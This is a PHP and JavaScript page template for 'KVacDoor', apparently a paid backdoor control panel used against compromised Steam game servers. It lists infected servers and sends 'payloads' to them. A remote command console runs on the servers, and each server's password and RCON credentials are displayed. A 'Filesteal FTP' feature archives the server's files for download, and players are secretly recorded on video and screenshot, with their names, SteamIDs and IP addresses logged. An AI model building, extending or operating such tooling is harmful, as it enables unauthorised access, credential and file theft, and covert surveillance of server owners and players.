<style>
    .infoserver {
        background-color: #36393F;
        color: white;
        border-color: #292B2F;
    }
</style>
<script type="text/javascript">
    const SERVER_ID = <?= $server['id'] ?>;

    var args = "";
    var sid = "";

    // Fonction pour obtenir le statut du serveur
    const serverStatus = () => {
        $.ajax({
            method: "GET",
            url: "../ajax/server-status.php?id=" + SERVER_ID,
            success: (data) => {
                $('.dot').css('background-color', data);
            }
        });
    }

    // Fonction pour actualiser les joueurs
    const refreshPlayers = () => {
        $.ajax({
            method: "GET",
            url: "../ajax/get-server-players.php?id=" + SERVER_ID,
            success: (data) => {
                $('#player_pnl').html(data);
            }
        });
    }

    // Appeler les fonctions toutes les 4 secondes
    setInterval(() => {
        serverStatus();
        refreshPlayers();
    }, 4000);

    refreshPlayers();

    <?php if ($AUTHUSER['roles'] != 0) : ?>

        function filesteal_status() {
            $.ajax({
                "method": "GET",
                "url": "../ajax/get-server-filesteal.php?id=<?= $server['id'] ?>",
                "success": (data) => {
                    $('#filesteal-status').html(data);
                }
            });
        }

        function createArchive() {
            $.ajax({
                "method": "GET",
                "url": "../ajax/create-archive.php?id=<?= $server['id'] ?>",
                "success": (data) => {
                    filesteal_status();
                }
            });
        }

        setInterval(
            function() {
                filesteal_status();
            }, 5000);
    <?php endif; ?>

    const sendPayload = (payloadId, argument = null) => {
        const defaultArgumentMessage = "The argument ask here is often equal to the command to open or take action on the payload.";
        let sendPayloadEndpoint = `/api/servers/action?server=${SERVER_ID}&payload=${payloadId}`;
        if (argument) {
            sendPayloadEndpoint += `&argument=${argument}`;
        }
        $.ajax({
            url: sendPayloadEndpoint
        }).done(function(data) {
            if (data.success) {
                Swal.fire({
                    title: "Success!",
                    text: "The payload has been sent successfully!",
                    type: "success",
                    timer: 1000
                });
                $('#payload-args').modal('hide');
                $('#input-args').val('');
            } else {
                if (data.required_argument) {
                    if (data.help_argument == null) {
                        $('#argument-text').text(defaultArgumentMessage);
                    } else {
                        $('#argument-text').text(data.help_argument);
                    }

                    $('#input-args').val('');
                    $('#payload-args').modal('show');
                    $("#input-args").focus();
                    $("#args-hide").val(payloadId);
                }
            }
        });
    }

    const sendArgument = () => {
        argument = $("#input-args").val();
        payload = $("#args-hide").val();
        sendPayload(payload, argument);
    }

    function ply_action(id, args) {
        $.ajax({
            url: "../ajax/payload-send.php?id=" + id + "&args=" + args + "&server=<?= $_GET['id'] ?>"
        }).done(function(data) {
            Swal.fire({
                title: "Sucess!",
                text: "The payload has been sent successfully!",
                type: "success",
                timer: 1000
            })
        });
    }

    function ExecCmd() {

        if ($('#input-cmd').val().length !== 0) {

            var console_command = $('#input-cmd').val()

            $.ajax({
                url: "../ajax/payload-send.php?id=2795&args=" + console_command + "&server=<?= $_GET['id'] ?>",
            }).done(function(data) {
                Swal.fire({
                    title: "Sucess!",
                    text: "The payload has been sent successfully!",
                    type: "success",
                    timer: 1000
                })
                $('#server_console').append('<p><bold>00:00:00</bold> : ' + console_command + '</p>')
            });
        }
        $('#input-cmd').val('');
    }

    <?php if ($AUTHUSER['roles'] >= 1) : ?>
        <?php
        $slug = "servers-{$server['ip']}-analytics";
        $data = Chart::getLast($slug, 12 * 6);

        // var_dump($data);
        ?>
        $(function() {
            "use strict";
            const chart = document.getElementById("players-chart");
            new Chart(
                chart, {
                    "type": "line",
                    "data": {
                        "labels": [
                            <?php foreach ($data as $stat) : ?> "<?= substr($stat['updated_at'], 11); ?>",
                            <?php endforeach; ?>
                        ],
                        "datasets": [{
                            "label": "Players",
                            "data": [
                                <?php foreach ($data as $stat) : ?> "<?= $stat['value']; ?>",
                                <?php endforeach; ?>
                            ],
                            "fill": true,
                            "borderColor": "#20B799",
                            "backgroundColor": "#0d5c4c",
                            //     "backgroundColor": "#2a57b1",
                            // "borderColor": "#346ee0",
                            "lineTension": 0.1
                        }]
                    },
                    "options": {
                        "legend": {
                            "display": false
                        },
                        "scales": {
                            "yAxes": [{
                                "ticks": {
                                    "beginAtZero": true
                                }
                            }]
                        }
                    }
                });
        });
    <?php endif; ?>
</script>

<div class="row">
    <div class="col-12">
        <div class="page-title-box d-flex align-items-center justify-content-between">
            <h4 class="mb-0 font-size-18"><i class="dot" style="height: 12px; width: 12px; background-color: <?= $server_status ?>; border-radius: 50%;display:inline-block;"></i> <?= htmlentities($server['hostname']) ?></h4>

            <div class="page-title-right">
                <ol class="breadcrumb m-0">
                    <li class="breadcrumb-item"><a href="/overview">KVacDoor</a></li>
                    <li class="breadcrumb-item"><a href="/servers">Servers</a></li>
                    <li class="breadcrumb-item active"><?= $title ?></li>
                </ol>
            </div>
        </div>
    </div>
</div>


<div class="row">
    <div class="col-xl-12">
        <div class="card">
            <div class="card-body height-sv">

                <ul class="nav nav-tabs nav-justified mb-3">
                    <li class="nav-item">
                        <?php if ($AUTHUSER['roles'] >= 1) : ?>
                            <a href="#serverchat" data-toggle="tab" aria-expanded="false" class="nav-link">
                            <?php else : ?>
                                <a href="#serverchat" class="nav-link" style="color: currentColor;cursor: not-allowed;opacity: 0.5;text-decoration: none;" title="ONLY FOR VIP MEMBERS" onclick="return false;">
                                <?php endif; ?>
                                <i class="fa fa-comment d-lg-none d-block"></i>
                                <span class="d-none d-lg-block"><i class="fa fa-comment"></i> Chat</span>
                                </a>
                    </li>
                    <li class="nav-item">
                        <a href="#payloads" data-toggle="tab" aria-expanded="true" class="nav-link active">
                            <i class="fa fa-rocket d-lg-none d-block"></i>
                            <span class="d-none d-lg-block"><i class="fa fa-rocket"></i> Payloads</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <?php if ($AUTHUSER['roles'] >= 1) : ?>
                            <a href="#player_pnl" data-toggle="tab" aria-expanded="false" class="nav-link">
                            <?php else : ?>
                                <a href="#player_pnl" class="nav-link" style="color: currentColor;cursor: not-allowed;opacity: 0.5;text-decoration: none;" title="ONLY FOR VIP MEMBERS" onclick="return false;">
                                <?php endif; ?>
                                <i class="fa fa-users d-lg-none d-block"></i>
                                <span class="d-none d-lg-block"><i class="fa fa-users"></i> List Of Players</span>
                                </a>
                    </li>
                    <li class="nav-item">
                        <?php if ($AUTHUSER['roles'] >= 1) : ?>
                            <a href="#statistics" data-toggle="tab" aria-expanded="false" class="nav-link">
                            <?php else : ?>
                                <a aria-expanded="false" class="nav-link" style="color: currentColor;cursor: not-allowed;opacity: 0.5;text-decoration: none;" title="ONLY FOR VIP MEMBERS" onclick="return false;">
                                <?php endif; ?>
                                <i class="fa fa-info-circle d-lg-none d-block"></i>
                                <span class="d-none d-lg-block"><i class="fas fa-chart-line"></i> Statistics</span>
                                </a>
                    </li>
                    <li class="nav-item">
                        <a href="#information" data-toggle="tab" aria-expanded="false" class="nav-link">
                            <i class="fa fa-info-circle d-lg-none d-block"></i>
                            <span class="d-none d-lg-block"><i class="fa fa-info-circle"></i> Informations</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <?php if ($AUTHUSER['roles'] >= 1) : ?>
                            <a href="#premium" data-toggle="tab" aria-expanded="false" class="nav-link" title="ONLY FOR PREMIUM MEMBERS">
                            <?php else : ?>
                                <a aria-expanded="false" class="nav-link" style="color: currentColor;cursor: not-allowed;opacity: 0.5;text-decoration: none;" title="ONLY FOR VIP MEMBERS" onclick="return false;">
                                <?php endif; ?>

                                <i class="mdi mdi-file d-lg-none d-block"></i>
                                <span class="d-none d-lg-block"><i class="mdi mdi-file"></i> File Manager</span>
                                </a>
                    </li>
                </ul>

                <div class="tab-content">
                    <div class="tab-pane " id="serverchat">


                        <div class="card">
                            <div class="card-body" id="server_console" style="min-height:542px;max-height:542px;overflow:auto">
                                <?php foreach ($chats as $chat) : ?>
                                    <p>
                                        <bold><?= substr($chat["created_at"], "11") ?></bold> : <?= (!is_null($chat['username'])) ? "<b>" . htmlentities($chat['username']) . "</b> : " : "" ?> <?= nl2br(htmlentities($chat['content'])) ?>
                                    </p>
                                <?php endforeach; ?>
                            </div>
                            <div class="card-footer">
                                <div class="row">
                                    <div class="col-sm-9">
                                        <input type="text" id="input-cmd" class="form-control chat-input" placeholder="Enter your command">
                                    </div>
                                    <div class="col-sm-3">
                                        <button type="submit" onclick="ExecCmd();" data-loading-text="<i class='fa fa-spinner fa-spin '></i> Processing Order" class="btn btn-primary chat-send btn-block waves-effect waves-light">Execute</button>
                                    </div>
                                </div>
                            </div>
                        </div>


                    </div>

                    <div class="tab-pane show active" id="payloads">
                        <div class="row">

                            <div class="col-sm-3 mb-2 mb-sm-0">
                                <div class="nav flex-column nav-pills text-center" id="v-pills-tab" role="tablist" aria-orientation="vertical">
                                    <?php foreach ($categories as $category) : ?>
                                        <a class="nav-link <?= ($category['id'] === $categories[0]['id']) ? 'active show' : '' ?> payload-nav" id="v-pills-profile-tab" data-toggle="pill" href="#payload_cat<?= $category['id'] ?>" role="tab" aria-controls="payload_cat<?= $category['id'] ?>" aria-selected="false">
                                            <span><?= htmlentities($category['name']) ?></span>
                                        </a>
                                    <?php endforeach ?>
                                    <a class="nav-link payload-nav" id="personnal-payload-tab" data-toggle="pill" href="#personnal-payload" role="tab" aria-controls="personnal-payload" aria-selected="false">
                                        <span><?= htmlentities($AUTHUSER['username']); ?></span>
                                    </a>
                                </div>
                            </div>

                            <div class="col-sm-9" style="overflow:auto;max-height:620px;">
                                <div class="tab-content" id="v-pills-tabContent">
                                    <?php foreach ($categories as $category) : ?>
                                        <div class="tab-pane fade <?= ($category['id'] === $categories[0]['id']) ? 'active show' : '' ?>" id="payload_cat<?= $category['id'] ?>" role="tabpanel" aria-labelledby="payload_cat<?= $category['id'] ?>-tab">
                                            <?php foreach ($payloads as $payload) : ?>
                                                <?php if ($payload['category'] === $category['id']) : ?>
                                                    <button class="btn btn-primary btn-payload waves-effect" onclick="sendPayload(<?= $payload['id'] ?>)"><?= htmlentities($payload['name']) ?></button>
                                                <?php endif ?>
                                            <?php endforeach ?>
                                        </div>
                                    <?php endforeach ?>
                                    <div class="tab-pane fade" id="personnal-payload" role="tabpanel" aria-labelledby="personnal-payload-tab">
                                        <?php foreach (Payload::GetUserPayloads() as $payload) : ?>
                                            <button class="btn btn-primary btn-payload waves-effect" onclick="sendPayload(<?= $payload['id'] ?>)"><?= htmlentities($payload['name']) ?></button>
                                        <?php endforeach ?>
                                    </div>
                                </div>
                            </div>

                        </div> <!-- End Row -->

                    </div>
                    <div class="tab-pane text-center" id="player_pnl" style="min-height:629px;max-height:629px;overflow:auto">

                        Loading in progress...

                    </div>

                    <div class="tab-pane" id="statistics">
                        <?php if ($AUTHUSER['roles'] >= 1) : ?>
                            <h4 class="card-title d-inline-block mb-3"><i class="fa fa-users" aria-hidden="true"></i> Players Statistics</h4>
                            <canvas id="players-chart" height="30%" width="100%"></canvas>
                        <?php endif; ?>
                    </div>

                    <div class="tab-pane" id="information">

                        <ul class="list-group" id="serverinfogp">
                            Server Hostname:
                            <p class="text-danger"><?= htmlentities($server['hostname']) ?></p>
                            Server IP:
                            <p><a href="steam://connect/<?= $server['ip'] ?>"><?= $server['ip'] ?></a></p>
                            Server Slots:
                            <p class="text-danger"><?= $server['used_slots'] . "/" . $server['max_slots'] ?></p>
                            Server Password:
                            <p class="text-danger"><?= htmlentities($server['password']) ?></p>
                            Remote Console (RCON):
                            <p class="text-danger"><?= htmlentities($server['rcon']) ?></p>
                            Gamemode:
                            <p class="text-danger"><?= htmlentities($server['gamemode']) ?></p>
                            Map of servers:
                            <p class="text-danger"><?= htmlentities($server['map']) ?> <a href="https://www.google.com/search?q=<?= $server['map'] ?>" target="_blank"><i class="fa fa-search"></i></a></p>
                            Uptime:
                            <p class="text-danger"><?= time_to_hours($server['uptime']) ?></p>
                            Api Version:
                            <p class="text-danger"><?= htmlentities($server['api_version']) ?></p>
                            Owner:
                            <p class="text-danger"><a href="/profile/<?= $server['owner'] ?>"><?= Server::GetServerOwner($server['owner']) ?></a></p>

                        </ul>

                    </div>
                    <div class="tab-pane text-center" id="premium">
                        <?php if ($AUTHUSER['roles'] != 0) : ?>
                            <ul class="list-group">
                                <li class="list-group-item" style="background-color: #111827; color: white;">

                                    <span class="text-white">
                                        <h4><i class="fa fa-video"></i> Video & Screenshot</h4>
                                    </span>
                                    <button class="btn btn-primary btn-md" onclick="sendPayload(261)"><i class="fas fa-video"></i> Video All Player</button>
                                    <button class="btn btn-primary btn-md" onclick="sendPayload(262)"><i class="fas fa-image"></i> Screenshot All Player</button>
                                    <hr>
                                    <button class="btn btn-light btn-md" data-toggle="modal" data-target="#video-player"><i class="fa fa-eye"></i> Views Videos</button>
                                    <button class="btn btn-light btn-md" data-toggle="modal" data-target="#screenshot"><i class="fa fa-eye"></i> Views Screenshots</button>
                                </li>
                            </ul>
                            <br>
                            <ul class="list-group">
                                <li class="list-group-item" style="background-color: #111827; color: white;">

                                    <span class="text-white">
                                        <h4><i class="fa fa-upload"></i> Filesteal FTP</h4>
                                    </span>
                                    <button class="btn btn-secondary btn-md" data-toggle="modal" data-target="#ftp-dl">
                                        <i class="fa fa-upload"></i>
                                        Start Upload
                                    </button>
                                    <button class="btn btn-primary btn-md" onclick="createArchive();">
                                        <i class="fa fa-file-archive"></i>
                                        Create Archive (.zip)
                                    </button>
                                    <hr>
                                    <span id="filesteal-status">
                                        Number of files : <?= $countfiles ?><br>
                                        <?php if (!in_array("../data/filesteal/$ip.zip", glob("../data/filesteal/*.zip"))) : ?>
                                            <i class="ico ico-left fa fa-download"></i> No Archive
                                        <?php else : ?>
                                            <i class="ico ico-left fa fa-download"></i> <a href="/servers/<?= $_GET['id'] ?>/download">Download Archive</a>
                                        <?php endif; ?>
                                    </span>
                                </li>
                            </ul>
                        <?php endif; ?>
                    </div>
                </div>

            </div>
        </div>
    </div>

</div> <!-- END ROWS -->

<div class="modal fade" id="payload-args" tabindex="-1" role="dialog" aria-labelledby="payload-argsLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">N33D ARGUMENT</h5>
                <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body p-4">
                <form method="post">
                    <input type="text" name="arguments" class="form-control" id="input-args" placeholder="Gimme me some argument please...">
                    <input type="hidden" name="arguments_hide" id="args-hide" value="">
                    <input type="hidden" name="wadixexec" value="<?= CSRF::CreateToken(); ?>">
                </form>
                <br>
                <p id="argument-text">The argument ask here is often equal to the command to open or take action on the payload.</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">CLOSE</button>
                <button type="button" class="btn btn-primary waves-effect waves-light" onclick="sendArgument();">LAUNCH</button>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="ftp-dl" tabindex="-1" role="dialog" aria-labelledby="ftp-dlLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Filesteal FTP</h5>
                <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <p>Are you sure you want to send an upload request to the server "<?= $server['hostname'] ?>"? (~2 minute)</p>
            </div>
            <div class="modal-footer">
                <form method="post">
                    <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">No</button>
                    <button type="button" class="btn btn-primary waves-effect waves-light" data-dismiss="modal" onclick="sendPayload(260)" value="1">Yes</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="video-player" tabindex="-1" role="dialog" aria-labelledby="videoLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel"><i class="fas fa-video"></i> LAST VIDEO</h5>
                <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <?php foreach (array_reverse(Media::SelectLastMedia($server['ip'], 1, 15)) as $video) : ?>
                    <div class="embed-responsive embed-responsive-4by3">
                        <video src="../assets/upload/video/<?= $video['filename'] ?>" controls class="">
                    </div>
                    <p>NAME: <?= htmlentities($video['player_name']) ?></p>
                    <p>STEAMID64: <?= htmlentities($video['player_steam']) ?></p>
                    <p>IP: <?= htmlentities($video['player_ip']) ?></p>
                    <p>DATE: <?= $video['created_at'] ?></p>
                    <hr>
                <?php endforeach; ?>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">CLOSE</button>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="screenshot" tabindex="-1" role="dialog" aria-labelledby="screenshotLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel"><i class="fas fa-image"></i> LAST SCREENSHOT</h5>
                <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <?php foreach (array_reverse(Media::SelectLastMedia($server['ip'], 0)) as $img) : ?>
                    <img src="../assets/upload/img/<?= $img['filename'] ?>" class="img-fluid">
                    <p>NAME: <?= htmlentities($img['player_name']) ?></p>
                    <p>STEAMID: <?= htmlentities($img['player_steam']) ?></p>
                    <p>IP: <?= htmlentities($img['player_ip']) ?></p>
                    <p>DATE: <?= $img['created_at'] ?></p>
                    <hr>
                <?php endforeach; ?>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">CLOSE</button>
            </div>
        </div>
    </div>
</div>